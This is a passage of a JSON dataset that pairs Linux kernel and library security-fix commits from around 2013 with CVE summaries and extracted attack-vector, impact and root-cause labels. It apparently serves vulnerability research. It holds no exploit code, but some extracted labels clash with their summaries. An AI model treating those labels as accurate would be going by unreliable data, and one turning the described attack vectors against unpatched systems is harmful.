bt_sock_recvmsg ( ) return with <number> without updating msg_namelen leading to net\/<file> leaking the local , uninitialized sockaddr_storage variable to userland -- <number> byte of kernel stack memory","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not properly initialize a certain length variable","Attack Type":"local attacker"},{"commit_id":"ef3313e84acbf349caecae942ab3ab731471f1a1","cve_id":"CVE-2013-3223","cwe_id":"CWE-200","commit_message":"ax25: fix info leak via msg_name in ax25_recvmsg()\n\nWhen msg_namelen is non-zero the sockaddr info gets filled out, as\nrequested, but the code fails to initialize the padding bytes of struct\nsockaddr_ax25 inserted by the compiler for alignment. Additionally the\nmsg_namelen value is updated to sizeof(struct full_sockaddr_ax25) but is\nnot always filled up to this size.\n\nBoth issues lead to the fact that the code will leak uninitialized\nkernel stack bytes in net\/socket.c.\n\nFix both issues by initializing the memory with memset(0).\n\nCc: Ralf Baechle <ralf@linux-mips.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ax25_recvmsg function in net\/ax25\/af_ax25.c in the Linux kernel before 3.9-rc7 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix info leak via msg_name in ax25_recvmsg ( ) when msg_namelen is non-zero the sockaddr info get filled out , a requested , but the code fails to initialize the padding byte of struct sockaddr_ax25 inserted by the compiler for alignment","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"9b3e617f3df53822345a8573b6d358f6b9e5ed87","cve_id":"CVE-2013-3222","cwe_id":"CWE-200","commit_message":"atm: update msg_namelen in vcc_recvmsg()\n\nThe current code does not fill the msg_name member in case it is set.\nIt also does not set the msg_namelen member to 0 and therefore makes\nnet\/socket.c leak the local, uninitialized sockaddr_storage variable\nto userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared\nabout vcc_recvmsg() not filling the msg_name in case it was set.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The vcc_recvmsg function in net\/atm\/common.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"update msg_namelen in vcc_recvmsg ( ) the current code doe not fill the msg_name member in case it is set","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain length variable ","Attack Type":"local attacker"},{"commit_id":"72a763d805a48ac8c0bf48fdb510e84c12de51fe","cve_id":"CVE-2013-3076","cwe_id":"CWE-200","commit_message":"crypto: algif - suppress sending source address information in recvmsg\n\nThe current code does not set the msg_namelen member to 0 and therefore\nmakes net\/socket.c leak the local sockaddr_storage variable to userland\n-- 128 bytes of kernel stack memory. Fix that.\n\nCc: <stable@vger.kernel.org> # 2.6.38\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"The crypto API in the Linux kernel through 3.9-rc8 does not initialize certain length variables, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call, related to the hash_recvmsg function in crypto\/algif_hash.c and the skcipher_recvmsg function in crypto\/algif_skcipher.c.","commit_message_1":"algif - suppress sending source address information in recvmsg the current code doe not set the msg_namelen member to <number> and therefore make net\/<file> leak the local sockaddr_storage variable to userland -- <number> byte of kernel stack memory","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call , related to the hash _ recvmsg function in crypto \/ algif _ hash . c and the skcipher _ recvmsg function in crypto \/ algif _ skcipher . c ","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize certain length variables","Attack Type":"local attacker"},{"commit_id":"12ae030d54ef250706da5642fc7697cc60ad0df7","cve_id":"CVE-2013-2930","cwe_id":"CWE-264","commit_message":"perf\/ftrace: Fix paranoid level for enabling function tracer\n\nThe current default perf paranoid level is \"1\" which has\n\"perf_paranoid_kernel()\" return false, and giving any operations that\nuse it, access to normal users. Unfortunately, this includes function\ntracing and normal users should not be allowed to enable function\ntracing by default.\n\nThe proper level is defined at \"-1\" (full perf access), which\n\"perf_paranoid_tracepoint_raw()\" will only give access to. Use that\ncheck instead for enabling function tracing.\n\nReported-by: Dave Jones <davej@redhat.com>\nReported-by: Vince Weaver <vincent.weaver@maine.edu>\nTested-by: Vince Weaver <vincent.weaver@maine.edu>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Ingo Molnar <mingo@kernel.org>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Frederic Weisbecker <fweisbec@gmail.com>\nCc: stable@vger.kernel.org # 3.4+\nCVE: CVE-2013-2930\nFixes: ced39002f5ea (\"ftrace, perf: Add support to use function tracepoint in perf\")\nSigned-off-by: Steven Rostedt <rostedt@goodmis.org>","summary":"The perf_trace_event_perm function in kernel\/trace\/trace_event_perf.c in the Linux kernel before 3.12.2 does not properly restrict access to the perf subsystem, which allows local users to enable function tracing via a crafted application.","commit_message_1":"fix paranoid level for enabling function tracer the current default perf paranoid level is `` <number> '' which ha `` perf_paranoid_kernel ( ) '' return false , and giving any operation that use it , access to normal user","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application","Impact":"enable function tracing","Root Cause":"does not properly restrict access to the perf subsystem","Attack Type":"local attacker"},{"commit_id":"d049f74f2dbe71354d43d393ac3a188947811348","cve_id":"CVE-2013-2929","cwe_id":"CWE-264","commit_message":"exec\/ptrace: fix get_dumpable() incorrect tests\n\nThe get_dumpable() return value is not boolean.  Most users of the\nfunction actually want to be testing for non-SUID_DUMP_USER(1) rather than\nSUID_DUMP_DISABLE(0).  The SUID_DUMP_ROOT(2) is also considered a\nprotected state.  Almost all places did this correctly, excepting the two\nplaces fixed in this patch.\n\nWrong logic:\n    if (dumpable == SUID_DUMP_DISABLE) { \/* be protective *\/ }\n        or\n    if (dumpable == 0) { \/* be protective *\/ }\n        or\n    if (!dumpable) { \/* be protective *\/ }\n\nCorrect logic:\n    if (dumpable != SUID_DUMP_USER) { \/* be protective *\/ }\n        or\n    if (dumpable != 1) { \/* be protective *\/ }\n\nWithout this patch, if the system had set the sysctl fs\/suid_dumpable=2, a\nuser was able to ptrace attach to processes that had dropped privileges to\nthat user.  (This may have been partially mitigated if Yama was enabled.)\n\nThe macros have been moved into the file that declares get\/set_dumpable(),\nwhich means things like the ia64 code can see them too.\n\nCVE-2013-2929\n\nReported-by: Vasily Kulikov <segoon@openwall.com>\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: \"Luck, Tony\" <tony.luck@intel.com>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: \"Eric W. Biederman\" <ebiederm@xmission.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The Linux kernel before 3.12.2 does not properly use the get_dumpable function, which allows local users to bypass intended ptrace restrictions or obtain sensitive information from IA64 scratch registers via a crafted application, related to kernel\/ptrace.c and arch\/ia64\/include\/asm\/processor.h.","commit_message_1":"fix get_dumpable ( ) incorrect test the get_dumpable ( ) return value is not boolean","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application , related to kernel \/ ptrace . c and arch \/ ia64 \/ include \/ asm \/ processor . h","Impact":"bypass intended ptrace restrictions or obtain sensitive information from ia64 scratch registers","Root Cause":"does not properly use the get _ dumpable function","Attack Type":"local attacker"},{"commit_id":"cea4dcfdad926a27a18e188720efe0f2c9403456","cve_id":"CVE-2013-2850","cwe_id":"CWE-119","commit_message":"iscsi-target: fix heap buffer overflow on error\n\nIf a key was larger than 64 bytes, as checked by iscsi_check_key(), the\nerror response packet, generated by iscsi_add_notunderstood_response(),\nwould still attempt to copy the entire key into the packet, overflowing\nthe structure on the heap.\n\nRemote preauthentication kernel memory corruption was possible if a\ntarget was configured and listening on the network.\n\nCVE-2013-2850\n\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org\nSigned-off-by: Nicholas Bellinger <nab@linux-iscsi.org>","summary":"Heap-based buffer overflow in the iscsi_add_notunderstood_response function in drivers\/target\/iscsi\/iscsi_target_parameters.c in the iSCSI target subsystem in the Linux kernel through 3.9.4 allows remote attackers to cause a denial of service (memory corruption and OOPS) or possibly execute arbitrary code via a long key that is not properly handled during construction of an error-response packet.","commit_message_1":"fix heap buffer overflow on error if a key wa larger than <number> byte , a checked by iscsi_check_key ( ) , the error response packet , generated by iscsi_add_notunderstood_response ( ) , would still attempt to copy the entire key into the packet , overflowing the structure on the heap","Vulnerability Type":"buffer overflow","Attack Vector":"via a long key that is not properly handled during construction of an error - response packet","Impact":"cause a denial of service ( memory corruption and oops ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the iscsi_add_notunderstood_response() function","Attack Type":"remote attacker"},{"commit_id":"0840b13612a0b7ef1ce7441cf811dcfc6b463fba","cve_id":"CVE-2013-2765","cwe_id":null,"commit_message":"Fixed: chuck null pointer when unknown CT is sent and over in-memory limit","summary":"The ModSecurity module before 2.7.4 for the Apache HTTP Server allows remote attackers to cause a denial of service (NULL pointer dereference, process crash, and disk consumption) via a POST request with a large body and a crafted Content-Type header.","commit_message_1":"chuck null pointer when unknown ct is sent and over in-memory limit","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a post request with a large body and a crafted content - type header","Impact":"cause a denial of service ( pointer dereference , process crash , and disk consumption )","Root Cause":"caused by an error when processing the forceRequestBodyVariable action","Attack Type":"remote attacker"},{"commit_id":"c085c49920b2f900ba716b4ca1c1a55ece9872cc","cve_id":"CVE-2013-2636","cwe_id":"CWE-399","commit_message":"bridge: fix mdb info leaks\n\nThe bridging code discloses heap and stack bytes via the RTM_GETMDB\nnetlink interface and via the notify messages send to group RTNLGRP_MDB\nafer a successful add\/del.\n\nFix both cases by initializing all unset members\/padding bytes with\nmemset(0).\n\nCc: Stephen Hemminger <stephen@networkplumber.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/bridge\/br_mdb.c in the Linux kernel before 3.8.4 does not initialize certain structures, which allows local users to obtain sensitive information from kernel memory via a crafted application.","commit_message_1":"fix mdb info leak the bridging code discloses heap and stack byte via the rtm_getmdb netlink interface and via the notify message send to group rtnlgrp_mdb afer a successful add\/del","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize certain structures","Attack Type":"local attacker"},{"commit_id":"84d73cd3fb142bf1298a8c13fd4ca50fd2432372","cve_id":"CVE-2013-2635","cwe_id":"CWE-399","commit_message":"rtnl: fix info leak on RTM_GETLINK request for VF devices\n\nInitialize the mac address buffer with 0 as the driver specific function\nwill probably not fill the whole buffer. In fact, all in-kernel drivers\nfill only ETH_ALEN of the MAX_ADDR_LEN bytes, i.e. 6 of the 32 possible\nbytes. Therefore we currently leak 26 bytes of stack memory to userland\nvia the netlink interface.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The rtnl_fill_ifinfo function in net\/core\/rtnetlink.c in the Linux kernel before 3.8.4 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"fix info leak on rtm_getlink request for vf device initialize the mac address buffer with <number> a the driver specific function will probably not fill the whole buffer","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure member","Attack Type":"local attacker"},{"commit_id":"29cd8ae0e1a39e239a3a7b67da1986add1199fc0","cve_id":"CVE-2013-2634","cwe_id":"CWE-399","commit_message":"dcbnl: fix various netlink info leaks\n\nThe dcb netlink interface leaks stack memory in various places:\n* perm_addr[] buffer is only filled at max with 12 of the 32 bytes but\n  copied completely,\n* no in-kernel driver fills all fields of an IEEE 802.1Qaz subcommand,\n  so we're leaking up to 58 bytes for ieee_ets structs, up to 136 bytes\n  for ieee_pfc structs, etc.,\n* the same is true for CEE -- no in-kernel driver fills the whole\n  struct,\n\nPrevent all of the above stack info leaks by properly initializing the\nbuffers\/structures involved.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/dcb\/dcbnl.c in the Linux kernel before 3.8.4 does not initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"fix various netlink info leak the dcb netlink interface leak stack memory in various place : * perm_addr [ ] buffer is only filled at max with <number> of the <number> byte but copied completely , * no in-kernel driver fill all field of an ieee <file> subcommand , so we 're leaking up to <number> byte for ieee_ets structs , up to <number> byte for ieee_pfc structs , etc","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize certain structures","Attack Type":"local attacker"},{"commit_id":"fc9bbca8f650e5f738af8806317c0a041a48ae4a","cve_id":"CVE-2013-2596","cwe_id":"CWE-189","commit_message":"vm: convert fb_mmap to vm_iomap_memory() helper\n\nThis is my example conversion of a few existing mmap users.  The\nfb_mmap() case is a good example because it is a bit more complicated\nthan some: fb_mmap() mmaps one of two different memory areas depending\non the page offset of the mmap (but happily there is never any mixing of\nthe two, so the helper function still works).\n\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Integer overflow in the fb_mmap function in drivers\/video\/fbmem.c in the Linux kernel before 3.8.9, as used in a certain Motorola build of Android 4.1.2 and other products, allows local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted \/dev\/graphics\/fb0 mmap2 system calls, as demonstrated by the Motochopper pwn program.","commit_message_1":"convert fb_mmap to vm_iomap_memory ( ) helper this is my example conversion of a few existing mmap user","Vulnerability Type":"integer overflow","Attack Vector":"via crafted \/ dev \/ graphics \/ fb0 mmap2 system calls , as demonstrated by the motochopper pwn program","Impact":"create a read - write memory mapping for the entirety of kernel memory , and consequently gain privileges","Root Cause":"caused by insecure file permissions set on the Motorola's Android OS bootloader module","Attack Type":"local attacker"},{"commit_id":"9a5467bf7b6e9e02ec9c3da4e23747c05faeaac6","cve_id":"CVE-2013-2548","cwe_id":"CWE-310","commit_message":"crypto: user - fix info leaks in report API\n\nThree errors resulting in kernel memory disclosure:\n\n1\/ The structures used for the netlink based crypto algorithm report API\nare located on the stack. As snprintf() does not fill the remainder of\nthe buffer with null bytes, those stack bytes will be disclosed to users\nof the API. Switch to strncpy() to fix this.\n\n2\/ crypto_report_one() does not initialize all field of struct\ncrypto_user_alg. Fix this to fix the heap info leak.\n\n3\/ For the module name we should copy only as many bytes as\nmodule_name() returns -- not as much as the destination buffer could\nhold. But the current code does not and therefore copies random data\nfrom behind the end of the module name, as the module name is always\nshorter than CRYPTO_MAX_ALG_NAME.\n\nAlso switch to use strncpy() to copy the algorithm's name and\ndriver_name. They are strings, after all.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"The crypto_report_one function in crypto\/crypto_user.c in the report API in the crypto user configuration API in the Linux kernel through 3.8.2 uses an incorrect length value during a copy operation, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability.","commit_message_1":"user - fix info leak in report api three error resulting in kernel memory disclosure : <number>\/ the structure used for the netlink based crypto algorithm report api are located on the stack","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by leveraging the cap _ net _ admin capability .","Impact":"obtain sensitive information","Root Cause":"uses an incorrect length value during a copy operation ,","Attack Type":"local attacker"},{"commit_id":"85dfb745ee40232876663ae206cba35f24ab2a40","cve_id":"CVE-2013-2237","cwe_id":"CWE-119","commit_message":"af_key: initialize satype in key_notify_policy_flush()\n\nThis field was left uninitialized. Some user daemons perform check against this\nfield.\n\nSigned-off-by: Nicolas Dichtel <nicolas.dichtel@6wind.com>\nSigned-off-by: Steffen Klassert <steffen.klassert@secunet.com>","summary":"The key_notify_policy_flush function in net\/key\/af_key.c in the Linux kernel before 3.9 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel heap memory by reading a broadcast message from the notify_policy interface of an IPSec key_socket.","commit_message_1":"initialize satype in key_notify_policy_flush ( ) this field wa left uninitialized","Vulnerability Type":"buffer overflow","Attack Vector":"by reading a broadcast message from the notify _ policy interface of an ipsec key _ socket","Impact":"obtain sensitive information from kernel heap memory","Root Cause":"does not initialize a certain structure member","Attack Type":"local attacker"},{"commit_id":"a5cc68f3d63306d0d288f31edfc2ae6ef8ecd887","cve_id":"CVE-2013-2234","cwe_id":"CWE-119","commit_message":"af_key: fix info leaks in notify messages\n\nkey_notify_sa_flush() and key_notify_policy_flush() miss to initialize\nthe sadb_msg_reserved member of the broadcasted message and thereby\nleak 2 bytes of heap memory to listeners. Fix that.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Steffen Klassert <steffen.klassert@secunet.com>\nCc: \"David S. Miller\" <davem@davemloft.net>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The (1) key_notify_sa_flush and (2) key_notify_policy_flush functions in net\/key\/af_key.c in the Linux kernel before 3.10 do not initialize certain structure members, which allows local users to obtain sensitive information from kernel heap memory by reading a broadcast message from the notify interface of an IPSec key_socket.","commit_message_1":"fix info leak in notify message key_notify_sa_flush ( ) and key_notify_policy_flush ( ) miss to initialize the sadb_msg_reserved member of the broadcasted message and thereby leak <number> byte of heap memory to listener","Vulnerability Type":"buffer overflow","Attack Vector":"by reading a broadcast message from the notify interface of an ipsec key _ socket","Impact":"obtain sensitive information from kernel heap memory","Root Cause":"do not initialize certain structure members","Attack Type":"local attacker"},{"commit_id":"a963a37d384d71ad43b3e9e79d68d42fbe0901f3","cve_id":"CVE-2013-2232","cwe_id":"CWE-20","commit_message":"ipv6: ip6_sk_dst_check() must not assume ipv6 dst\n\nIt's possible to use AF_INET6 sockets and to connect to an IPv4\ndestination. After this, socket dst cache is a pointer to a rtable,\nnot rt6_info.\n\nip6_sk_dst_check() should check the socket dst cache is IPv6, or else\nvarious corruptions\/crashes can happen.\n\nDave Jones can reproduce immediate crash with\ntrinity -q -l off -n -c sendmsg -c connect\n\nWith help from Hannes Frederic Sowa\n\nReported-by: Dave Jones <davej@redhat.com>\nReported-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ip6_sk_dst_check function in net\/ipv6\/ip6_output.c in the Linux kernel before 3.10 allows local users to cause a denial of service (system crash) by using an AF_INET6 socket for a connection to an IPv4 interface.","commit_message_1":"ip6_sk_dst_check ( ) must not assume ipv6 dst it 's possible to use af_inet6 socket and to connect to an ipv4 destination","Vulnerability Type":"Improper Input Validation","Attack Vector":"by using an af _ inet6 socket for a connection to an ipv4 interface","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"13c149b051f82b709e8d7cc32111e84b49d57234","cve_id":"CVE-2013-2220","cwe_id":"CWE-119","commit_message":"Fix a security issue in radius_get_vendor_attr().\n\nThe underlying rad_get_vendor_attr() function assumed that it would always be\ngiven valid VSA data. Indeed, the buffer length wasn't even passed in; the\nassumption was that the length field within the VSA structure would be valid.\n\nThis could result in denial of service by providing a length that would be\nbeyond the memory limit, or potential arbitrary memory access by providing a\nlength greater than the actual data given.\n\nrad_get_vendor_attr() has been changed to require the raw data length be\nprovided, and this is then used to check that the VSA is valid.\n\nConflicts:\n\tradlib_vs.h","summary":"Buffer overflow in the radius_get_vendor_attr function in the Radius extension before 1.2.7 for PHP allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large Vendor Specific Attributes (VSA) length value.","commit_message_1":"fix a security issue in radius_get_vendor_attr ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via a large vendor specific attributes ( vsa ) length value","Impact":"cause a denial of service ( crash ) and possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the radius_get_vendor_attr() function","Attack Type":"remote attacker"},{"commit_id":"f2815633504b442ca0b0605c16bf3d88a3a0fcea","cve_id":"CVE-2013-2206","cwe_id":null,"commit_message":"sctp: Use correct sideffect command in duplicate cookie handling\n\nWhen SCTP is done processing a duplicate cookie chunk, it tries\nto delete a newly created association.  For that, it has to set\nthe right association for the side-effect processing to work.\nHowever, when it uses the SCTP_CMD_NEW_ASOC command, that performs\nmore work then really needed (like hashing the associationa and\nassigning it an id) and there is no point to do that only to\ndelete the association as a next step.  In fact, it also creates\nan impossible condition where an association may be found by\nthe getsockopt() call, and that association is empty.  This\ncauses a crash in some sctp getsockopts.\n\nThe solution is rather simple.  We simply use SCTP_CMD_SET_ASOC\ncommand that doesn't have all the overhead and does exactly\nwhat we need.\n\nReported-by: Karl Heiss <kheiss@gmail.com>\nTested-by: Karl Heiss <kheiss@gmail.com>\nCC: Neil Horman <nhorman@tuxdriver.com>\nSigned-off-by: Vlad Yasevich <vyasevich@gmail.com>\nAcked-by: Neil Horman <nhorman@tuxdriver.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_sf_do_5_2_4_dupcook function in net\/sctp\/sm_statefuns.c in the SCTP implementation in the Linux kernel before 3.8.5 does not properly handle associations during the processing of a duplicate COOKIE ECHO chunk, which allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via crafted SCTP traffic.","commit_message_1":"use correct sideffect command in duplicate cookie handling when sctp is done processing a duplicate cookie chunk , it try to delete a newly created association","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via crafted sctp traffic","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"does not properly handle associations during the processing of a duplicate cookie echo chunk","Attack Type":"remote attacker"},{"commit_id":"192c4f788d48f82c03e9cef40013f34370e90737","cve_id":"CVE-2013-2174","cwe_id":"CWE-119","commit_message":"Curl_urldecode: no peeking beyond end of input buffer\n\nSecurity problem: CVE-2013-2174\n\nIf a program would give a string like \"%FF\" to curl_easy_unescape() but\nask for it to decode only the first byte, it would still parse and\ndecode the full hex sequence. The function then not only read beyond the\nallowed buffer but it would also deduct the *unsigned* counter variable\nfor how many more bytes there's left to read in the buffer by two,\nmaking the counter wrap. Continuing this, the function would go on\nreading beyond the buffer and soon writing beyond the allocated target\nbuffer...\n\nBug: http:\/\/curl.haxx.se\/docs\/adv_20130622.html\nReported-by: Timo Sirainen","summary":"Heap-based buffer overflow in the curl_easy_unescape function in lib\/escape.c in cURL and libcurl 7.7 through 7.30.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted string ending in a *%* (percent) character.","commit_message_1":"no peeking beyond end of input buffer security problem : <cve_id> if a program would give a string like `` % ff '' to curl_easy_unescape ( ) but ask for it to decode only the first byte , it would still parse and decode the full hex sequence","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted string ending in a * % * ( percent ) character","Impact":"cause a denial of service ( application crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the curl_easy_unescape() function","Attack Type":"remote attacker"},{"commit_id":"f1923820c447e986a9da0fc6bf60c1dccdf0408e","cve_id":"CVE-2013-2146","cwe_id":"CWE-20","commit_message":"perf\/x86: Fix offcore_rsp valid mask for SNB\/IVB\n\nThe valid mask for both offcore_response_0 and\noffcore_response_1 was wrong for SNB\/SNB-EP,\nIVB\/IVB-EP. It was possible to write to\nreserved bit and cause a GP fault crashing\nthe kernel.\n\nThis patch fixes the problem by correctly marking the\nreserved bits in the valid mask for all the processors\nmentioned above.\n\nA distinction between desktop and server parts is introduced\nbecause bits 24-30 are only available on the server parts.\n\nThis version of the  patch is just a rebase to perf\/urgent tree\nand should apply to older kernels as well.\n\nSigned-off-by: Stephane Eranian <eranian@google.com>\nCc: peterz@infradead.org\nCc: jolsa@redhat.com\nCc: gregkh@linuxfoundation.org\nCc: security@kernel.org\nCc: ak@linux.intel.com\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"arch\/x86\/kernel\/cpu\/perf_event_intel.c in the Linux kernel before 3.8.9, when the Performance Events Subsystem is enabled, specifies an incorrect bitmask, which allows local users to cause a denial of service (general protection fault and system crash) by attempting to set a reserved bit.","commit_message_1":"fix offcore_rsp valid mask for snb\/ivb the valid mask for both offcore_response_0 and offcore_response_1 wa wrong for snb\/snb-ep , ivb\/ivb-ep","Vulnerability Type":"Improper Input Validation","Attack Vector":"by attempting to set a reserved bit","Impact":"cause a denial of service ( general protection fault and system crash )","Root Cause":"caused by the incorrect masking of the reserved bits","Attack Type":"local attacker"},{"commit_id":"604c499cbbcc3d5fe5fb8d53306aa0fae1990109","cve_id":"CVE-2013-2140","cwe_id":"CWE-20","commit_message":"xen\/blkback: Check device permissions before allowing OP_DISCARD\n\nWe need to make sure that the device is not RO or that\nthe request is not past the number of sectors we want to\nissue the DISCARD operation for.\n\nThis fixes CVE-2013-2140.\n\nCc: stable@vger.kernel.org\nAcked-by: Jan Beulich <JBeulich@suse.com>\nAcked-by: Ian Campbell <Ian.Campbell@citrix.com>\n[v1: Made it pr_warn instead of pr_debug]\nSigned-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>","summary":"The dispatch_discard_io function in drivers\/block\/xen-blkback\/blkback.c in the Xen blkback implementation in the Linux kernel before 3.10.5 allows guest OS users to cause a denial of service (data loss) via filesystem write operations on a read-only disk that supports the (1) BLKIF_OP_DISCARD (aka discard or TRIM) or (2) SCSI UNMAP feature.","commit_message_1":"check device permission before allowing op_discard we need to make sure that the device is not ro or that the request is not past the number of sector we want to issue the discard operation for","Vulnerability Type":"Improper Input Validation","Attack Vector":"via filesystem write operations on a read - only disk that supports the ( 1 ) blkif _ op _ discard ( aka discard or trim ) or ( 2 ) scsi unmap feature","Impact":"cause a denial of service ( data loss )","Root Cause":"caused by the failure to properly check for disk write permissions by the dispatch_discard_io() function","Attack Type":"local attacker"},{"commit_id":"baff42ab1494528907bf4d5870359e31711746ae","cve_id":"CVE-2013-2128","cwe_id":"CWE-119","commit_message":"net: Fix oops from tcp_collapse() when using splice()\n\ntcp_read_sock() can have a eat skbs without immediately advancing copied_seq.\nThis can cause a panic in tcp_collapse() if it is called as a result\nof the recv_actor dropping the socket lock.\n\nA userspace program that splices data from a socket to either another\nsocket or to a file can trigger this bug.\n\nSigned-off-by: Steven J. Magnani <steve@digidescorp.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tcp_read_sock function in net\/ipv4\/tcp.c in the Linux kernel before 2.6.34 does not properly manage skb consumption, which allows local users to cause a denial of service (system crash) via a crafted splice system call for a TCP socket.","commit_message_1":"fix oops from tcp_collapse ( ) when using splice ( ) tcp_read_sock ( ) can have a eat skbs without immediately advancing copied_seq","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted splice system call for a tcp socket","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly manage skb consumption","Attack Type":"local attacker"},{"commit_id":"2f912f5b33582961b1cdbd9fd828589f8b78f21d","cve_id":"CVE-2013-2127","cwe_id":"CWE-119","commit_message":"fixed wrong data_maximum calcluation; prevent out-of-buffer in exp_bef","summary":"Buffer overflow in the exposure correction code in LibRaw before 0.15.1 allows context-dependent attackers to cause a denial of service (crash) and possibly execute arbitrary code via unspecified vectors.","commit_message_1":"fixed wrong data_maximum calcluation ; prevent out-of-buffer in exp_bef","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service ( crash ) and possibly execute arbitrary code","Root Cause":"caused by improper bounds checking during exposure correction","Attack Type":"remote attacker"},{"commit_id":"19ffddb0fe1a4ffdb459b797ffcf7f490d28b5a6","cve_id":"CVE-2013-2126","cwe_id":"CWE-399","commit_message":"prevent double-free() on broken full-color images error handling","summary":"Multiple double free vulnerabilities in the LibRaw::unpack function in libraw_cxx.cpp in LibRaw before 0.15.2 allow context-dependent attackers to cause a denial of service (application crash) and possibly execute arbitrary code via a malformed full-color (1) Foveon or (2) sRAW image file.","commit_message_1":"prevent double-free ( ) on broken full-color image error handling","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a malformed full - color foveon or sraw image file","Impact":"cause a denial of service ( application crash ) and possibly execute arbitrary code","Root Cause":"caused by a double-free error when handling damaged full-color within Foveon and sRAW files","Attack Type":"attacker"},{"commit_id":"11d21349a4e7e38a025849479b36ace7c2eec2ee","cve_id":"CVE-2013-2061","cwe_id":"CWE-200","commit_message":"Use constant time memcmp when comparing HMACs in openvpn_decrypt.\n\nSigned-off-by: Steffan Karger <steffan.karger@fox-it.com>\nAcked-by: Gert Doering <gert@greenie.muc.de>\nSigned-off-by: Gert Doering <gert@greenie.muc.de>","summary":"The openvpn_decrypt function in crypto.c in OpenVPN 2.3.0 and earlier, when running in UDP mode, allows remote attackers to obtain sensitive information via a timing attack involving an HMAC comparison function that does not run in constant time and a padding oracle attack on 